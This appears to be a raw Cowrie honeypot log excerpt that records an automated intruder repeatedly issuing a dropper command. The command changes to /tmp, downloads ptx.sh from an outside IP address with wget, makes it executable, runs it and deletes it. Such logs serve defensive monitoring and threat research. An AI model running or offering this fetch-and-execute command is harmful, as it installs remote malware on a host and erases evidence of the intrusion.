+2017-03-01T13:22:57+0000 [-] Command found: rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: sh 
+2017-03-01T13:22:57+0000 [-] Command not found: shell
+2017-03-01T13:22:57+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://188.209.52.150/ptx.sh>
